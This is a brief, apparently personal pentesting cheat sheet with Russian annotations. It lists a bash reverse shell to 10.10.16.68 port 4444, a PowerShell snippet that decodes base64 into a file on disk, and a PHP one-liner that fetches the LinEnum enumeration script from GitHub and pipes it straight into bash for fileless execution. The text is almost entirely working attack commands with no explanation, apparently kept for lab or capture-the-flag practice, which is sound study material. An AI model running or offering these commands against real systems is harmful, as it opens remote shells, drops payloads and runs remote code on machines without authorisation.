/bin/bash -i >& /dev/tcp/10.10.16.68/4444 0>&1

decode base64 с помощью powershell и сохранение в файл Windows:

$b64      = 'AAAAAA...'
$filename = 'C:\path\to\file'
$bytes = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes($filename, $bytes)

Безфайловая Загрузка с помощью PHP и выполнение :
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

